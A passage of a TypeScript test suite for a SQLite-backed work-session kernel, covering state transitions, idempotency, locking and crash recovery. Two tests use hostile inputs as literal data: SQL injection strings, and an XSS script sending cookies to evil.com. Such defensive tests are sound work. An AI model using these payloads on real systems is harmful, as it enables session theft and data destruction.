import test from 'node:test'
import assert from 'node:assert/strict'
import * as os from 'node:os'
import * as path from 'node:path'
import * as fs from 'node:fs'
import {
  WorkSessionKernel,
  WorkSessionNotFoundError,
  InvalidWorkSessionTransitionError,
  RevisionConflictError,
  CommandConflictError,
  DataRootLockedError,
  SchemaVersionUnsupportedError,
  DatabaseCorruptionError,
  KernelNotReadyError,
  KernelShuttingDownError,
  ValidationFailedError,
  CURRENT_KERNEL_SCHEMA_VERSION,
} from '../index.js'
import { DatabaseSync } from 'node:sqlite'
import { spawnSync } from 'node:child_process'

function createTempDir(prefix: string): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), `gravitas-k0-test-${prefix}-`))
}

function cleanTempDir(dir: string): void {
  try {
    fs.rmSync(dir, { recursive: true, force: true })
  } catch {
    // ignore cleanup errors on temp dirs
  }
}

function runFaultWorker(mode: string, dataRoot: string): void {
  const workerScript = './packages/core/src/kernel/__tests__/fault-worker.ts'
  const loaderScript = './packages/core/scripts/test-loader.mjs'
  spawnSync(process.execPath, [
    '--experimental-strip-types',
    '--loader', loaderScript,
    workerScript,
    mode,
    dataRoot,
  ], {
    stdio: 'ignore',
  })
}

test('GRAVITAS K0 WORKSESSION KERNEL TEST SUITE', async (t) => {

  // =========================================================================
  // Section 31 — 25 Standard Contract Tests
  // =========================================================================

  await t.test('TEST 01: Create WorkSession initializes database, writes entity, and increments revision to 1', async () => {
    const dir = createTempDir('01-create')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      const res = await kernel.executeCommand({
        commandId: 'cmd-ws-create-01',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-test-01',
        payload: {
          title: 'Session Alpha',
          goal: 'Demonstrate initial creation',
          baseRef: 'main',
          workspacePath: 'C:/repos/demo',
        },
      })

      assert.equal(res.success, true)
      assert.equal(res.currentRevision, 1)

      const snapshot = kernel.getWorkSessionSnapshot('ws-test-01')
      assert.equal(snapshot.workSession.id, 'ws-test-01')
      assert.equal(snapshot.workSession.title, 'Session Alpha')
      assert.equal(snapshot.workSession.state, 'CREATED')
      assert.equal(snapshot.workSession.revision, 1)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 02: Retrieve WorkSession returns complete matching entity', async () => {
    const dir = createTempDir('02-retrieve')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-create-02',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-02',
        payload: { title: 'Retrieve Session', goal: 'Test retrieval', baseRef: 'HEAD' },
      })

      const ws = kernel.getWorkSession('ws-02')
      assert.ok(ws)
      assert.equal(ws.id, 'ws-02')
      assert.equal(ws.goal, 'Test retrieval')

      // Non-existent throws WorkSessionNotFoundError
      assert.throws(() => {
        kernel.getWorkSessionSnapshot('ws-does-not-exist')
      }, (err: unknown) => err instanceof WorkSessionNotFoundError)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 03: Persistence after restart - state survives clean process shutdown', async () => {
    const dir = createTempDir('03-persist')
    try {
      // First instance
      const k1 = new WorkSessionKernel({ dataRoot: dir })
      await k1.start()
      await k1.executeCommand({
        commandId: 'cmd-create-03',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-03',
        payload: { title: 'Persistent Session', goal: 'Survive restart' },
      })
      await k1.shutdown()

      // Second instance on same data root
      const k2 = new WorkSessionKernel({ dataRoot: dir })
      await k2.start()
      const ws = k2.getWorkSession('ws-03')
      assert.ok(ws)
      assert.equal(ws.id, 'ws-03')
      assert.equal(ws.title, 'Persistent Session')
      assert.equal(ws.revision, 1)

      await k2.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 04: Valid FSM transition updates state and increments revision', async () => {
    const dir = createTempDir('04-fsm-valid')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-create-04',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-04',
        payload: { title: 'FSM Test', goal: 'Transition test' },
      })

      // INITIALIZING -> PLANNING
      const res = await kernel.executeCommand({
        commandId: 'cmd-trans-04',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-04',
        expectedRevision: 1,
        payload: {
          targetState: 'READY',
          reason: 'Beginning task decomposition',
        },
      })

      assert.equal(res.success, true)
      assert.equal(res.currentRevision, 2)

      const ws = kernel.getWorkSession('ws-04')
      assert.equal(ws?.state, 'READY')
      assert.equal(ws?.revision, 2)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 05: Illegal FSM transition rejected fail-closed without mutating state', async () => {
    const dir = createTempDir('05-fsm-invalid')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-create-05',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-05',
        payload: { title: 'Illegal Transition Test', goal: 'Fail closed' },
      })

      // INITIALIZING -> COMPLETED directly is illegal
      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: 'cmd-trans-illegal-05',
          type: 'TRANSITION_WORK_SESSION',
          workSessionId: 'ws-05',
          expectedRevision: 1,
          payload: { targetState: 'COMPLETED' },
        })
      }, (err: unknown) => err instanceof InvalidWorkSessionTransitionError)

      // State and revision must remain unchanged
      const ws = kernel.getWorkSession('ws-05')
      assert.equal(ws?.state, 'CREATED')
      assert.equal(ws?.revision, 1)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 06: Durable event written for every state transition', async () => {
    const dir = createTempDir('06-events')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-create-06',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-06',
        payload: { title: 'Event Test', goal: 'Verify event log' },
      })

      const events = kernel.getEventsForSession('ws-06')
      assert.ok(events.length >= 1)
      const createEvent = events.find((e) => e.eventType === 'WORKSESSION_CREATED')
      assert.ok(createEvent)
      assert.equal(createEvent.aggregateId, 'ws-06')
      assert.equal(createEvent.aggregateType, 'WORKSESSION')
      assert.equal(createEvent.commandId, 'cmd-create-06')

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 07: Event sequence numbers are strictly monotonically increasing', async () => {
    const dir = createTempDir('07-monotonic')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-create-07',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-07',
        payload: { title: 'Seq Test', goal: 'Monotonic sequence' },
      })

      await kernel.executeCommand({
        commandId: 'cmd-p-07',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-07',
        expectedRevision: 1,
        payload: { targetState: 'READY' },
      })

      await kernel.executeCommand({
        commandId: 'cmd-a-07',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-07',
        expectedRevision: 2,
        payload: { targetState: 'ACTIVE' },
      })

      const events = kernel.getEventsForSession('ws-07')
      assert.equal(events.length, 3)
      assert.equal(events[0]?.sequenceNumber, 1)
      assert.equal(events[1]?.sequenceNumber, 2)
      assert.equal(events[2]?.sequenceNumber, 3)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 08: Duplicate identical command returns cached receipt without side effects (idempotency)', async () => {
    const dir = createTempDir('08-idempotent')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      const cmd = {
        commandId: 'cmd-idem-08',
        type: 'CREATE_WORK_SESSION' as const,
        workSessionId: 'ws-08',
        payload: { title: 'Idempotency Test', goal: 'Run twice' },
      }

      const res1 = await kernel.executeCommand(cmd)
      assert.equal(res1.success, true)
      assert.equal(res1.currentRevision, 1)

      // Re-issue exact same command
      const res2 = await kernel.executeCommand(cmd)
      assert.equal(res2.success, true)
      assert.equal(res2.currentRevision, 1)

      // Events should NOT be duplicated
      const events = kernel.getEventsForSession('ws-08')
      assert.equal(events.length, 1)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 09: Conflicting reused commandId fails closed with CommandConflictError', async () => {
    const dir = createTempDir('09-conflict')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-shared-09',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-09',
        payload: { title: 'First Session', goal: 'Original command' },
      })

      // Re-use same commandId with DIFFERENT payload
      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: 'cmd-shared-09',
          type: 'CREATE_WORK_SESSION',
          workSessionId: 'ws-09',
          payload: { title: 'Conflicting Session', goal: 'Tampered command' },
        })
      }, (err: unknown) => err instanceof CommandConflictError)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 10: Stale expectedRevision fails closed with RevisionConflictError', async () => {
    const dir = createTempDir('10-concurrency')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-create-10',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-10',
        payload: { title: 'Concurrency Test', goal: 'Optimistic locking' },
      })

      // Stale revision: expectedRevision = 0 when current is 1
      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: 'cmd-trans-10',
          type: 'TRANSITION_WORK_SESSION',
          workSessionId: 'ws-10',
          expectedRevision: 0,
          payload: { targetState: 'READY' },
        })
      }, (err: unknown) => err instanceof RevisionConflictError)

      const ws = kernel.getWorkSession('ws-10')
      assert.equal(ws?.revision, 1)
      assert.equal(ws?.state, 'CREATED')

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 11: Transaction rollback on failure leaves zero partial state', async () => {
    const dir = createTempDir('11-rollback')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-create-11',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-11',
        payload: { title: 'Rollback Test', goal: 'Atomic transaction' },
      })

      // Attempting an illegal transition fails and rolls back completely
      try {
        await kernel.executeCommand({
          commandId: 'cmd-fail-11',
          type: 'TRANSITION_WORK_SESSION',
          workSessionId: 'ws-11',
          expectedRevision: 1,
          payload: { targetState: 'COMPLETED' },
        })
      } catch {
        // Expected failure
      }

      // No receipt for cmd-fail-11 and no extra events
      const events = kernel.getEventsForSession('ws-11')
      assert.equal(events.length, 1)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 12: Schema initialization creates all required tables and PRAGMAs on new database', async () => {
    const dir = createTempDir('12-schema-init')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      const dbPath = path.join(dir, 'gravitas_kernel.db')
      assert.ok(fs.existsSync(dbPath))

      const db = new DatabaseSync(dbPath)
      const tables = db
        .prepare("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name")
        .all() as { name: string }[]
      const tableNames = tables.map((t) => t.name)

      assert.ok(tableNames.includes('schema_migrations'))
      assert.ok(tableNames.includes('work_sessions'))
      assert.ok(tableNames.includes('runs'))
      assert.ok(tableNames.includes('tasks'))
      assert.ok(tableNames.includes('durable_events'))
      assert.ok(tableNames.includes('command_receipts'))
      assert.ok(tableNames.includes('durable_jobs'))
      assert.ok(tableNames.includes('k5_verification_receipts'))
      assert.ok(tableNames.includes('model_observations'))
      db.close()

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 13: Reopening existing schema succeeds without schema mutation', async () => {
    const dir = createTempDir('13-reopen')
    try {
      const k1 = new WorkSessionKernel({ dataRoot: dir })
      await k1.start()
      await k1.shutdown()

      const k2 = new WorkSessionKernel({ dataRoot: dir })
      await k2.start()
      assert.equal(k2.getLifecycleState(), 'READY')
      await k2.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 14: Unsupported schema version throws SchemaVersionUnsupportedError', async () => {
    const dir = createTempDir('14-unsupported-schema')
    try {
      // Create database and seed a future migration version
      const dbPath = path.join(dir, 'gravitas_kernel.db')
      const db = new DatabaseSync(dbPath)
      db.exec(`
        CREATE TABLE schema_migrations (
          version INTEGER PRIMARY KEY,
          applied_at TEXT NOT NULL,
          description TEXT NOT NULL
        );
        INSERT INTO schema_migrations (version, applied_at, description)
        VALUES (999, '2026-10-01T00:00:00.000Z', 'Future schema');
      `)
      db.close()

      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await assert.rejects(async () => {
        await kernel.start()
      }, (err: unknown) => err instanceof SchemaVersionUnsupportedError)
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 15: Durable job persistence and query by state', async () => {
    const dir = createTempDir('15-jobs')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-job-15',
        type: 'CREATE_DURABLE_JOB',
        payload: {
          jobId: 'job-15',
          jobKind: 'TEST_MAINTENANCE',
          payload: { action: 'cleanup' },
        },
      })

      const pendingJobs = kernel.getDurableJobsByState('PENDING')
      assert.equal(pendingJobs.length, 1)
      assert.equal(pendingJobs[0]?.id, 'job-15')
      assert.equal(pendingJobs[0]?.state, 'PENDING')

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 16: Interrupted and expired job lease recovery', async () => {
    const dir = createTempDir('16-job-recovery')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-job-16',
        type: 'CREATE_DURABLE_JOB',
        payload: {
          jobId: 'job-16',
          jobKind: 'REPOSIT_INDEX',
        },
      })

      // Lease job with lease expiring immediately (in past)
      const pastTime = new Date(Date.now() - 10000).toISOString()
      await kernel.executeCommand({
        commandId: 'cmd-lease-16',
        type: 'CLAIM_JOB_LEASE',
        payload: {
          jobId: 'job-16',
          leasedBy: 'worker-node-1',
          leaseExpiresAt: pastTime,
        },
      })

      const leasedJobs = kernel.getDurableJobsByState('LEASED')
      assert.equal(leasedJobs.length, 1)

      // Restart kernel to trigger StartupReconciler
      await kernel.shutdown()

      const k2 = new WorkSessionKernel({ dataRoot: dir })
      await k2.start()

      const report = k2.getLastReconciliationReport()
      assert.ok(report)
      assert.equal(report.recoveredJobsCount, 1)

      const recoveredJobs = k2.getDurableJobsByState('EXPIRED')
      assert.equal(recoveredJobs.length, 1)
      assert.equal(recoveredJobs[0]?.id, 'job-16')

      await k2.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 17: Startup reconciliation is idempotent', async () => {
    const dir = createTempDir('17-idempotent-reconcile')
    try {
      const k1 = new WorkSessionKernel({ dataRoot: dir })
      await k1.start()

      // Create an active session and a running task
      await k1.executeCommand({
        commandId: 'cmd-ws-17',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-17',
        payload: { title: 'Crash Session', goal: 'Test idempotency' },
      })
      await k1.executeCommand({
        commandId: 'cmd-p-17',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-17',
        expectedRevision: 1,
        payload: { targetState: 'READY' },
      })
      await k1.executeCommand({
        commandId: 'cmd-a-17',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-17',
        expectedRevision: 2,
        payload: { targetState: 'ACTIVE' },
      })
      await k1.executeCommand({
        commandId: 'cmd-run-17',
        type: 'CREATE_RUN',
        workSessionId: 'ws-17',
        payload: { runId: 'run-17' },
      })
      await k1.executeCommand({
        commandId: 'cmd-task-17',
        type: 'CREATE_TASK',
        workSessionId: 'ws-17',
        payload: { taskId: 'task-17', runId: 'run-17', title: 'Running task' },
      })
      await k1.executeCommand({
        commandId: 'cmd-task-run-17',
        type: 'TRANSITION_TASK',
        workSessionId: 'ws-17',
        payload: { taskId: 'task-17', targetState: 'RUNNING' },
      })

      // Simulate crash: release lock without shutting down cleanly
      k1['lock'].release()

      // Reconcile once
      const k2 = new WorkSessionKernel({ dataRoot: dir })
      await k2.start()
      const report1 = k2.getLastReconciliationReport()
      assert.ok(report1)
      assert.equal(report1.interruptedTasksCount, 1)
      assert.equal(report1.interruptedSessionsCount, 1)

      // Restart again: second reconcile should find 0 interrupted tasks/sessions
      await k2.shutdown()

      const k3 = new WorkSessionKernel({ dataRoot: dir })
      await k3.start()
      const report2 = k3.getLastReconciliationReport()
      assert.ok(report2)
      assert.equal(report2.interruptedTasksCount, 0)
      assert.equal(report2.interruptedSessionsCount, 0)

      await k3.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 18: Clean shutdown releases lock and stops accepting commands', async () => {
    const dir = createTempDir('18-shutdown')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()
      assert.equal(kernel.getLifecycleState(), 'READY')

      await kernel.shutdown()
      assert.equal(kernel.getLifecycleState(), 'STOPPED')

      // Commands rejected with KernelNotReadyError
      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: 'cmd-after-shutdown',
          type: 'CREATE_WORK_SESSION',
          workSessionId: 'ws-18',
          payload: { title: 'Late command', goal: 'Should fail' },
        })
      }, (err: unknown) => err instanceof KernelNotReadyError)
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 19: Query snapshot produces complete aggregated representation', async () => {
    const dir = createTempDir('19-snapshot')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-ws-19',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-19',
        payload: { title: 'Snapshot Test', goal: 'Snapshot inspection' },
      })
      await kernel.executeCommand({
        commandId: 'cmd-run-19',
        type: 'CREATE_RUN',
        workSessionId: 'ws-19',
        payload: { runId: 'run-19' },
      })
      await kernel.executeCommand({
        commandId: 'cmd-task-19',
        type: 'CREATE_TASK',
        workSessionId: 'ws-19',
        payload: { taskId: 'task-19', runId: 'run-19', title: 'Task in Snapshot' },
      })

      const snapshot = kernel.getWorkSessionSnapshot('ws-19')
      assert.equal(snapshot.workSession.id, 'ws-19')
      assert.equal(snapshot.runs.length, 1)
      assert.equal(snapshot.tasks.length, 1)
      assert.equal(snapshot.currentRevision, 3)
      assert.equal(snapshot.lastEventSequence, 3)
      assert.equal(snapshot.recoveryStatus, 'HEALTHY')

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 20: Live event subscription != canonical truth (durable log recovery)', async () => {
    const dir = createTempDir('20-events-canonical')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      const receivedLiveEvents: string[] = []
      // Client connects late, after first event
      await kernel.executeCommand({
        commandId: 'cmd-ws-20',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-20',
        payload: { title: 'Late Client', goal: 'Missed event' },
      })

      // Client subscribes
      const unsubscribe = kernel.subscribe((e) => {
        receivedLiveEvents.push(e.eventId)
      })

      await kernel.executeCommand({
        commandId: 'cmd-p-20',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-20',
        expectedRevision: 1,
        payload: { targetState: 'READY' },
      })

      // Client only got the second event via live push
      assert.equal(receivedLiveEvents.length, 1)

      // Client recovers missed events from durable event store
      const allEvents = kernel.getEventsSince(0)
      assert.equal(allEvents.length, 2)
      assert.equal(allEvents[0]?.sequenceNumber, 1)
      assert.equal(allEvents[1]?.sequenceNumber, 2)

      unsubscribe()
      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 21: Malformed command payload rejected fail-closed with ValidationFailedError', async () => {
    const dir = createTempDir('21-validation')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      // Empty workSessionId
      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: 'cmd-invalid-21',
          type: 'CREATE_WORK_SESSION',
          workSessionId: '',
          payload: { title: 'Invalid' },
        })
      }, (err: unknown) => err instanceof ValidationFailedError)

      // Blank commandId
      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: '',
          type: 'CREATE_WORK_SESSION',
          workSessionId: 'ws-21',
          payload: { title: 'Invalid' },
        })
      }, (err: unknown) => err instanceof ValidationFailedError)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 22: SQL injection payload remains treated strictly as literal data', async () => {
    const dir = createTempDir('22-sqli')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      const sqliTitle = "'; DROP TABLE work_sessions; --"
      const res = await kernel.executeCommand({
        commandId: 'cmd-sqli-22',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-22-sqli',
        payload: {
          title: sqliTitle,
          goal: "1' OR '1'='1",
        },
      })
      assert.equal(res.success, true)

      const ws = kernel.getWorkSession('ws-22-sqli')
      assert.ok(ws)
      assert.equal(ws.title, sqliTitle)

      // Verify table still exists and is intact
      const allSessions = kernel.getAllWorkSessions()
      assert.equal(allSessions.length, 1)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 23: Malicious script/HTML text stored safely as semantic data', async () => {
    const dir = createTempDir('23-xss-text')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      const xssPayload = '<script>window.location="http://evil.com/leak?"+document.cookie</script>'
      await kernel.executeCommand({
        commandId: 'cmd-xss-23',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-23',
        payload: {
          title: xssPayload,
          goal: '<img src=x onerror=alert(1)>',
        },
      })

      const ws = kernel.getWorkSession('ws-23')
      assert.equal(ws?.title, xssPayload)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('TEST 24: Isolated data roots operate independently without interference', async () => {
    const dirA = createTempDir('24-dir-a')
    const dirB = createTempDir('24-dir-b')
    try {
      const kA = new WorkSessionKernel({ dataRoot: dirA })
      const kB = new WorkSessionKernel({ dataRoot: dirB })

      await kA.start()
      await kB.start()

      await kA.executeCommand({
        commandId: 'cmd-a-24',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-shared-id',
        payload: { title: 'Session in Root A', goal: 'Isolation test' },
      })

      await kB.executeCommand({
        commandId: 'cmd-b-24',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-shared-id',
        payload: { title: 'Session in Root B', goal: 'Isolation test' },
      })

      const wsA = kA.getWorkSession('ws-shared-id')
      const wsB = kB.getWorkSession('ws-shared-id')

      assert.equal(wsA?.title, 'Session in Root A')
      assert.equal(wsB?.title, 'Session in Root B')

      await kA.shutdown()
      await kB.shutdown()
    } finally {
      cleanTempDir(dirA)
      cleanTempDir(dirB)
    }
  })

  await t.test('TEST 25: Two independent Kernel instances do not compete as canonical writers (single-writer lock)', async () => {
    const dir = createTempDir('25-single-writer')
    try {
      const k1 = new WorkSessionKernel({ dataRoot: dir })
      await k1.start()

      const k2 = new WorkSessionKernel({ dataRoot: dir })
      await assert.rejects(async () => {
        await k2.start()
      }, (err: unknown) => err instanceof DataRootLockedError)

      await k1.shutdown()

      // After clean shutdown, k2 can start
      await k2.start()
      assert.equal(k2.getLifecycleState(), 'READY')
      await k2.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  // =========================================================================
  // Section 42 — 20 Adversarial & Boundary Attack Scenarios
  // =========================================================================

  await t.test('ADV 01: Conflicting command payload mutation rejected on duplicate commandId', async () => {
    const dir = createTempDir('adv-01')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-adv-01',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-adv-01',
        payload: { title: 'Original' },
      })

      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: 'cmd-adv-01',
          type: 'CREATE_WORK_SESSION',
          workSessionId: 'ws-adv-01',
          payload: { title: 'Forged' },
        })
      }, (err: unknown) => err instanceof CommandConflictError)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 02: Stale optimistic revision conflict with multiple updates', async () => {
    const dir = createTempDir('adv-02')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-adv-02-1',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-adv-02',
        payload: { title: 'Rev test' },
      })

      await kernel.executeCommand({
        commandId: 'cmd-adv-02-2',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-02',
        expectedRevision: 1,
        payload: { targetState: 'READY' },
      })

      // Stale attempt with revision 1 instead of 2
      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: 'cmd-adv-02-3',
          type: 'TRANSITION_WORK_SESSION',
          workSessionId: 'ws-adv-02',
          expectedRevision: 1,
          payload: { targetState: 'ACTIVE' },
        })
      }, (err: unknown) => err instanceof RevisionConflictError)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 03: Reopening dirty or aborted database performs clean rollback', async () => {
    const dir = createTempDir('adv-03')
    try {
      const dbPath = path.join(dir, 'gravitas_kernel.db')
      const db = new DatabaseSync(dbPath)
      db.exec('PRAGMA journal_mode = WAL;')
      db.close()

      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()
      assert.equal(kernel.getLifecycleState(), 'READY')
      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 04: Interrupted task in RUNNING state reconciled to INTERRUPTED', async () => {
    const dir = createTempDir('adv-04')
    try {
      const k1 = new WorkSessionKernel({ dataRoot: dir })
      await k1.start()

      await k1.executeCommand({
        commandId: 'cmd-ws-adv-04',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-adv-04',
        payload: { title: 'Task crash' },
      })
      await k1.executeCommand({
        commandId: 'cmd-run-adv-04',
        type: 'CREATE_RUN',
        workSessionId: 'ws-adv-04',
        payload: { runId: 'run-adv-04' },
      })
      await k1.executeCommand({
        commandId: 'cmd-task-adv-04',
        type: 'CREATE_TASK',
        workSessionId: 'ws-adv-04',
        payload: { taskId: 'task-adv-04', runId: 'run-adv-04', title: 'Task to crash' },
      })
      await k1.executeCommand({
        commandId: 'cmd-running-adv-04',
        type: 'TRANSITION_TASK',
        workSessionId: 'ws-adv-04',
        payload: { taskId: 'task-adv-04', targetState: 'RUNNING' },
      })

      k1['lock'].release()

      const k2 = new WorkSessionKernel({ dataRoot: dir })
      await k2.start()

      const snapshot = k2.getWorkSessionSnapshot('ws-adv-04')
      const task = snapshot.tasks.find((t) => t.id === 'task-adv-04')
      assert.equal(task?.state, 'INTERRUPTED')

      await k2.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 05: Session in WAITING_APPROVAL preserved across restart without auto-advance', async () => {
    const dir = createTempDir('adv-05')
    try {
      const k1 = new WorkSessionKernel({ dataRoot: dir })
      await k1.start()

      await k1.executeCommand({
        commandId: 'cmd-ws-adv-05',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-adv-05',
        payload: { title: 'Human Gate' },
      })
      await k1.executeCommand({
        commandId: 'cmd-p-adv-05',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-05',
        expectedRevision: 1,
        payload: { targetState: 'READY' },
      })
      await k1.executeCommand({
        commandId: 'cmd-act-adv-05',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-05',
        expectedRevision: 2,
        payload: { targetState: 'ACTIVE' },
      })
      await k1.executeCommand({
        commandId: 'cmd-appr-adv-05',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-05',
        expectedRevision: 3,
        payload: { targetState: 'WAITING_APPROVAL' },
      })

      k1['lock'].release()

      const k2 = new WorkSessionKernel({ dataRoot: dir })
      await k2.start()

      const ws = k2.getWorkSession('ws-adv-05')
      assert.equal(ws?.state, 'WAITING_APPROVAL')
      assert.equal(k2.getLastReconciliationReport()?.preservedApprovalSessionsCount, 1)

      await k2.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 06: Active session without running tasks transitioned to RECOVERY_REQUIRED', async () => {
    const dir = createTempDir('adv-06')
    try {
      const k1 = new WorkSessionKernel({ dataRoot: dir })
      await k1.start()

      await k1.executeCommand({
        commandId: 'cmd-ws-adv-06',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-adv-06',
        payload: { title: 'Active crash' },
      })
      await k1.executeCommand({
        commandId: 'cmd-p-adv-06',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-06',
        expectedRevision: 1,
        payload: { targetState: 'READY' },
      })
      await k1.executeCommand({
        commandId: 'cmd-a-adv-06',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-06',
        expectedRevision: 2,
        payload: { targetState: 'ACTIVE' },
      })

      k1['lock'].release()

      const k2 = new WorkSessionKernel({ dataRoot: dir })
      await k2.start()

      const ws = k2.getWorkSession('ws-adv-06')
      assert.equal(ws?.state, 'RECOVERY_REQUIRED')

      await k2.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 07: Stale data root lock with dead PID reclaimed safely', async () => {
    const dir = createTempDir('adv-07')
    try {
